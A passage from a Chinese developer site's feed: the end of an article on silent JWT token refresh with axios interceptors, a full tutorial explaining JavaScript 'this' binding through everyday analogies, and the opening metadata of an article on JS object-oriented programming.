      <span class="hljs-keyword">await</span> <span class="hljs-title function_">sleep</span>(<span class="hljs-number">500</span> * <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">pow</span>(<span class="hljs-number">2</span>, retries));
      <span class="hljs-keyword">return</span> <span class="hljs-title function_">tryRefresh</span>();
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-title function_">logout</span>();
    }
  }
}
</code></pre>
<p>但要注意不要过度重试，以免加重服务器负担。</p>
<hr/>
<h2 data-id="heading-15">六、优势总结：不只是“能用”</h2>
<p>这套方案之所以能在生产环境中长期稳定运行，源于以下几个核心特性：</p>





























<table><thead><tr><th>特性</th><th>说明</th></tr></thead><tbody><tr><td>✅ <strong>真正的无感体验</strong></td><td>用户无需感知 token 刷新过程，操作连续</td></tr><tr><td>✅ <strong>防并发刷新</strong></td><td>通过布尔锁保证最多只有一个 refresh 请求</td></tr><tr><td>✅ <strong>支持并发请求恢复</strong></td><td>所有因 token 过期而失败的请求都能被正确重放</td></tr><tr><td>✅ <strong>低耦合高内聚</strong></td><td>完全封装在拦截器中，业务代码零感知</td></tr><tr><td>✅ <strong>可维护性强</strong></td><td>结构清晰，易于调试和扩展</td></tr></tbody></table>
<p>更重要的是，它体现了一种 <strong>面向失败编程</strong> 的思维方式：我们不是在写“理想路径”，而是在设计“异常路径”的逃生通道。</p>
<hr/>
<h2 data-id="heading-16">七、潜在改进方向</h2>
<p>没有完美的架构，只有持续演进的系统。以下是一些可以进一步优化的方向：</p>
<h3 data-id="heading-17">1. 使用 AbortController 实现请求取消</h3>
<p>如果用户快速切换页面，部分已排队的请求可能已无意义。可通过注入 cancelToken 来支持取消机制。</p>
<h3 data-id="heading-18">2. 添加刷新日志上报</h3>
<p>记录 refresh 成功率、耗时、失败原因等指标，有助于发现潜在问题（如频繁刷新可能是前端时间不同步导致）。</p>
<h3 data-id="heading-19">3. 支持多实例共存</h3>
<p>在大型项目中，可能存在多个 axios 实例（例如文件上传专用实例），需确保拦截器逻辑能复用或继承。</p>
<hr/>
<h2 data-id="heading-20">八、结语：把异常当作常态来设计</h2>
<p>JWT 的最大优点是“无状态”，但这也意味着一旦签发就难以收回。正因为如此，我们才更需要在客户端建立一套可靠的容错机制。</p>
<p>本文所展示的“无感刷新”方案，不是一个炫技式的黑科技，而是一种务实的工程实践。它不追求极致性能，也不依赖复杂框架，而是用最朴素的锁和队列，解决了最真实的问题。</p>
<p>当你下次面对“token 过期怎么办”这个问题时，希望你能想到：</p>
<blockquote>
<p>“我不是要阻止错误发生，而是要让它发生得悄无声息。”</p>
</blockquote>
<p>这才是现代前端应有的成熟姿态。</p>
<hr/>
<p>📌 <strong>适用建议</strong></p>
<ul>
<li>✅ 单页应用（SPA）、管理系统、内容平台</li>
<li>✅ 使用 JWT + Refresh Token 的认证体系</li>
<li>✅ 对用户体验要求较高的产品</li>
<li>❌ 不适用于基于 Session-Cookie 的传统架构</li>
</ul>
<hr/>
<p>如果你也在构建类似的鉴权系统，欢迎留言交流你的实现方式。共勉！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[JavaScript this 指向：别再死记硬背，这样理解最轻松！]]></title>    <link>https://juejin.cn/post/7602440800296239150</link>    <guid>https://juejin.cn/post/7602440800296239150</guid>    <pubDate>2026-02-03T14:11:12.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602440800296239150" data-draft-id="7602464510607720474" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="JavaScript this 指向：别再死记硬背，这样理解最轻松！"/> <meta itemprop="keywords" content="JavaScript"/> <meta itemprop="datePublished" content="2026-02-03T14:11:12.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="不会敲代码1"/> <meta itemprop="url" content="https://juejin.cn/user/1927884034804425"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            JavaScript this 指向：别再死记硬背，这样理解最轻松！
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1927884034804425/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    不会敲代码1
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T14:11:12.000Z" title="Tue Feb 03 2026 14:11:12 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    5
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">JavaScript this 指向：别再死记硬背，这样理解最轻松！</h2>
<h3 data-id="heading-1">前言：从一个生活场景说起</h3>
<p>想象一下你在不同的场合介绍自己：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 在公司里</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">introduce</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"我是"</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> + <span class="hljs-string">"，在"</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">company</span> + <span class="hljs-string">"工作"</span>);
}

<span class="hljs-comment">// 场景1：作为员工自我介绍</span>
<span class="hljs-keyword">var</span> employee = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">"小明"</span>,
  <span class="hljs-attr">company</span>: <span class="hljs-string">"阿里"</span>,
  <span class="hljs-attr">intro</span>: introduce
};
employee.<span class="hljs-title function_">intro</span>(); <span class="hljs-comment">// "我是小明，在阿里工作" - this 指向 employee</span>

<span class="hljs-comment">// 场景2：换个环境说这个介绍</span>
<span class="hljs-keyword">var</span> say = employee.<span class="hljs-property">intro</span>;
<span class="hljs-title function_">say</span>(); <span class="hljs-comment">// "我是undefined，在undefined工作" - this 指向 window</span>
</code></pre>
<p><strong>同一个"介绍"的方式，在不同场合下，说的是不同的人！</strong> 这就是 this 的核心。</p>
<hr/>
<h3 data-id="heading-2">一、为什么 this 会指向全局？一个"忘记带名片"的比喻</h3>
<h4 data-id="heading-3">1.1 先看一个最简单的例子</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">var</span> myName = <span class="hljs-string">"全局名字"</span>;

<span class="hljs-keyword">function</span> <span class="hljs-title function_">sayName</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">myName</span>);
}

<span class="hljs-title function_">sayName</span>(); <span class="hljs-comment">// 输出："全局名字"</span>
</code></pre>
<p><strong>为什么指向全局？</strong></p>
<p>想象一下：</p>
<ul>
<li><code>obj.method()</code> 就像是小明在公司会议上说："我是公司的小明"</li>
<li><code>func()</code> 就像是小明在街上突然喊："我是谁？"</li>
<li>街上的路人（全局环境）问："你说的是谁的名字？"</li>
<li>小明说："我没带名片，就随便喊喊"</li>
<li>于是大家默认他说的是"街上的名人"（全局变量）</li>
</ul>
<h4 data-id="heading-4">1.2 再看我的学习笔记中的例子</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 这是你的 1.html 中的例子</span>
<span class="hljs-keyword">var</span> bar = {
  <span class="hljs-attr">myName</span>: <span class="hljs-string">'time.geekbang.com'</span>,
  <span class="hljs-attr">printName</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(myName);        <span class="hljs-comment">// 找变量（作用域链查找）</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">myName</span>);   <span class="hljs-comment">// 找"当前名片"上的名字</span>
  }
}

<span class="hljs-keyword">var</span> myName = <span class="hljs-string">'极客邦'</span>;
bar.<span class="hljs-title function_">printName</span>(); 
<span class="hljs-comment">// 1. "极客邦" - 变量查找，找到全局的</span>
<span class="hljs-comment">// 2. "time.geekbang.com" - this 指向 bar，用 bar 的名字</span>

<span class="hljs-comment">// 关键来了！</span>
<span class="hljs-keyword">var</span> _printName = bar.<span class="hljs-property">printName</span>; <span class="hljs-comment">// 只复制了"说话方式"，没复制"名片"</span>
<span class="hljs-title function_">_printName</span>();
<span class="hljs-comment">// 1. "极客邦" - 还是找到全局变量</span>
<span class="hljs-comment">// 2. undefined - this 指向 window，window.myName 不存在（如果是 var myName='极客邦'，这里会输出"极客邦"）</span>
</code></pre>
<hr/>
<h3 data-id="heading-5">二、this 的 5 种"说话场合"（对应你的笔记）</h3>
<h4 data-id="heading-6">2.1 场合一：作为员工说话（对象方法）</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 你的 2.html 例子</span>
<span class="hljs-keyword">var</span> myObj = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">'极客时间'</span>,
  <span class="hljs-attr">showThis</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>); <span class="hljs-comment">// 指向 myObj</span>
  }
}
myObj.<span class="hljs-title function_">showThis</span>(); <span class="hljs-comment">// 在"公司"说，说的是"公司的事"</span>
</code></pre>
<p><strong>比喻</strong>：在公司的会议室里，你说"我们公司"，指的是你所在的公司。</p>
<h4 data-id="heading-7">2.2 场合二：在街上说话（普通函数）</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 你的笔记中提到："普通函数运行时。this指向全局对象上"</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">foo</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>); <span class="hljs-comment">// window</span>
}
<span class="hljs-title function_">foo</span>();

<span class="hljs-comment">// 严格模式就是："别乱说话！"</span>
<span class="hljs-meta">'use strict'</span>;
<span class="hljs-keyword">function</span> <span class="hljs-title function_">strictFoo</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>); <span class="hljs-comment">// undefined</span>
}
<span class="hljs-title function_">strictFoo</span>();
</code></pre>
<p><strong>比喻</strong>：在街上大喊"我"，没有人知道你说的是谁，默认就是"街上的人"（全局）。</p>
<h4 data-id="heading-8">2.3 场合三：借别人身份说话（call/apply）</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 你的 2.html 第二个例子</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">foo</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">myName</span> = <span class="hljs-string">'极客时间'</span>;
}

<span class="hljs-keyword">let</span> bar = {
  <span class="hljs-attr">myName</span>: <span class="hljs-string">'极客邦'</span>,
  <span class="hljs-attr">test1</span>: <span class="hljs-number">1</span>
};

foo.<span class="hljs-title function_">call</span>(bar); <span class="hljs-comment">// "借用 bar 的身份说话"</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(bar.<span class="hljs-property">myName</span>); <span class="hljs-comment">// "极客时间" - bar 的名字被改了！</span>
</code></pre>
<p><strong>比喻</strong>：你拿着别人的名片说："我是XXX"，别人就把你当成那个人了。</p>
<h4 data-id="heading-9">2.4 场合四：新人自我介绍（构造函数）</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 你的 4.html 例子（修正版）</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">CreateObj</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// new 的时候：创建一个"新人"，让 this 指向他</span>
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = <span class="hljs-string">'极客时间'</span>;
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>); <span class="hljs-comment">// 指向新创建的对象</span>
}

<span class="hljs-keyword">var</span> myObj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CreateObj</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(myObj.<span class="hljs-property">name</span>); <span class="hljs-comment">// "极客时间"</span>
</code></pre>
<p><strong>比喻</strong>：新人入职时说"我是新来的小明"，这时候的"我"就是指向这个新人自己。</p>
<h4 data-id="heading-10">2.5 场合五：按钮被点击时说话（事件处理）</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 你的 5.html 例子</span>
<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'link'</span>).<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>); <span class="hljs-comment">// 指向被点击的 &lt;a&gt; 元素</span>
});
</code></pre>
<p><strong>比喻</strong>：按钮被按时说"我被按了"，说的就是按钮自己。</p>
<hr/>
<h3 data-id="heading-11">三、最容易出错的"名片丢失"问题</h3>
<h4 data-id="heading-12">3.1 的经典案例</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">var</span> myObj = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">"极客时间"</span>,
  <span class="hljs-attr">showThis</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = <span class="hljs-string">'极客邦'</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>);
  }
}

<span class="hljs-comment">// 第一种：拿着名片说话</span>
myObj.<span class="hljs-title function_">showThis</span>(); <span class="hljs-comment">// 输出 myObj，this.name 被改为"极客邦"</span>

<span class="hljs-comment">// 第二种：名片丢了！</span>
<span class="hljs-keyword">var</span> foo = myObj.<span class="hljs-property">showThis</span>; <span class="hljs-comment">// 只复制了"说话方式"</span>
<span class="hljs-title function_">foo</span>(); <span class="hljs-comment">// 输出 window，this.name 把 window.name 改了！</span>
</code></pre>
<p><strong>关键理解</strong>：</p>
<ul>
<li><code>myObj.showThis</code> 是"小明的说话方式"</li>
<li><code>var foo = myObj.showThis</code> 只是复制了"怎么说话"</li>
<li>没有复制"小明的名片"</li>
<li>所以 <code>foo()</code> 说话时，不知道说谁，默认说全局</li>
</ul>
<h4 data-id="heading-13">3.2 箭头函数：自带名片夹</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">var</span> myObj = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">"极客时间"</span>,
  <span class="hljs-attr">showThis</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// 普通函数：名片可能会丢</span>
    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>); <span class="hljs-comment">// undefined，名片丢了</span>
    }, <span class="hljs-number">100</span>);
    
    <span class="hljs-comment">// 箭头函数：把名片夹在身上</span>
    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>); <span class="hljs-comment">// "极客时间"，名片还在</span>
    }, <span class="hljs-number">100</span>);
  }
}
myObj.<span class="hljs-title function_">showThis</span>();
</code></pre>
<hr/>
<h3 data-id="heading-14">四、给你的学习笔记补充的"避坑指南"</h3>
<h4 data-id="heading-15">4.1 为什么会有这种设计？</h4>
<blockquote>
<p>"js的作者忘了处理这种情况...偷懒...直接让js指向全局？"</p>
</blockquote>
<p>更准确的理解是：
<strong>早期 JavaScript 想让网页脚本编写更简单</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 1995年的网页可能是这样的</span>
&lt;button onclick=<span class="hljs-string">"changeColor()"</span>&gt;变红色&lt;/button&gt;
<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
<span class="hljs-comment">// 如果没有全局 this，每个函数都要这么写：</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">changeColor</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">style</span>.<span class="hljs-property">color</span> = <span class="hljs-string">'red'</span>;
  <span class="hljs-comment">// 如果 this 不指向 window，就得写成 window.document...</span>
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span>
</code></pre>
<h4 data-id="heading-16">4.2 对象在内存的位置</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">//bar 是一个对象，定义在全局作用域</span>
<span class="hljs-comment">//对象在堆内存 在变量环境的栈内存中存放的只是对象在堆内存中的地址</span>
</code></pre>
<p>对象在堆里，变量只是存了个地址。同样：</p>
<ul>
<li><code>this</code> 也是个"地址"，指向当前说话的对象</li>
<li>函数调用时，才确定这个地址指向谁</li>
</ul>
<h4 data-id="heading-17">4.3 三个实用的记忆口诀</h4>
<ol>
<li>
<p><strong>"点前是谁就是谁"</strong></p>
<pre><code class="hljs language-javascript" lang="javascript">obj.<span class="hljs-title function_">method</span>(); <span class="hljs-comment">// this → obj</span>
</code></pre>
</li>
<li>
<p><strong>"没人点就找全局"</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title function_">method</span>(); <span class="hljs-comment">// this → window（非严格模式）</span>
</code></pre>
</li>
<li>
<p><strong>"箭头函数看爸爸"</strong></p>
<pre><code class="hljs language-javascript" lang="javascript">obj.<span class="hljs-property">method</span> = <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>); <span class="hljs-comment">// 看定义时的外层 this</span>
};
</code></pre>
</li>
</ol>
<hr/>
<h3 data-id="heading-18">五、实际开发中的"生存法则"</h3>
<h4 data-id="heading-19">5.1 法则一：不确定时，先打印看看</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">test</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'this 是：'</span>, <span class="hljs-variable language_">this</span>);
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'this 的类型：'</span>, <span class="hljs-keyword">typeof</span> <span class="hljs-variable language_">this</span>);
}

<span class="hljs-comment">// 各种情况都试试：</span>
<span class="hljs-title function_">test</span>();                    <span class="hljs-comment">// 独立调用</span>
obj.<span class="hljs-property">test</span> = test; obj.<span class="hljs-title function_">test</span>(); <span class="hljs-comment">// 作为方法</span>
<span class="hljs-keyword">new</span> <span class="hljs-title function_">test</span>();                <span class="hljs-comment">// 构造函数</span>
test.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>);  <span class="hljs-comment">// 指定 this</span>
</code></pre>
<h4 data-id="heading-20">5.2 法则二：用 bind 把名片钉死</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">var</span> obj = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">'小明'</span>,
  <span class="hljs-attr">say</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'我是'</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);
  }
};

<span class="hljs-comment">// 名片容易丢</span>
<span class="hljs-keyword">var</span> say = obj.<span class="hljs-property">say</span>;
<span class="hljs-title function_">say</span>(); <span class="hljs-comment">// "我是undefined"</span>

<span class="hljs-comment">// 用胶水粘住名片（bind）</span>
<span class="hljs-keyword">var</span> boundSay = obj.<span class="hljs-property">say</span>.<span class="hljs-title function_">bind</span>(obj);
<span class="hljs-title function_">boundSay</span>(); <span class="hljs-comment">// "我是小明" - 名片粘住了！</span>
</code></pre>
<h4 data-id="heading-21">5.3 法则三：class 中注意 this</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Button</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">text</span> = <span class="hljs-string">'点击'</span>;
    
    <span class="hljs-comment">// ❌ 这样会丢名片</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">element</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">handleClick</span>);
    
    <span class="hljs-comment">// ✅ 用 bind 粘住</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">element</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">handleClick</span>.<span class="hljs-title function_">bind</span>(<span class="hljs-variable language_">this</span>));
    
    <span class="hljs-comment">// ✅ 或者用箭头函数（自动粘）</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">element</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-function">() =&gt;</span> {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">handleClick</span>();
    });
  }
  
  <span class="hljs-title function_">handleClick</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">text</span>); <span class="hljs-comment">// 需要正确的 this</span>
  }
}
</code></pre>
<hr/>
<h3 data-id="heading-22">总结：一张图搞定 this</h3>
<pre><code class="hljs language-javascript" lang="javascript">谁在调用函数？            → <span class="hljs-variable language_">this</span> 指向谁？
-----------              -----------
对象.方法()               → 这个对象
方法()                   → 全局（或 <span class="hljs-literal">undefined</span>）
<span class="hljs-keyword">new</span> 函数()               → 新创建的对象
函数.<span class="hljs-title function_">call</span>(对象)          → call 的第一个参数
箭头函数                 → 定义时的外层 <span class="hljs-variable language_">this</span>
</code></pre>
<p><strong>最后记住</strong>：<code>this</code> 就像是你说话时的"我"。</p>
<ul>
<li>在会议室说"我" → 指你自己</li>
<li>在街上说"我" → 街上的人不知道你说谁，默认指"街上的人"</li>
<li>拿着别人名片说"我" → 指名片上的人</li>
<li>箭头函数说"我" → 永远指你爸爸是谁，你就是谁</li>
</ul>
<p>多写代码，多打印 <code>console.log(this)</code>，很快你就会形成直觉。加油！</p>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[《拆解 JS OOP 难点：构造函数、原型、Class 的底层关联》]]></title>    <link>https://juejin.cn/post/7602440800296271918</link>    <guid>https://juejin.cn/post/7602440800296271918</guid>    <pubDate>2026-02-03T14:33:46.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602440800296271918" data-draft-id="7602259669706063898" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="《拆解 JS OOP 难点：构造函数、原型、Class 的底层关联》"/> <meta itemprop="keywords" content="JavaScript,前端"/> <meta itemprop="datePublished" content="2026-02-03T14:33:46.000Z"/> <meta itemprop="image" 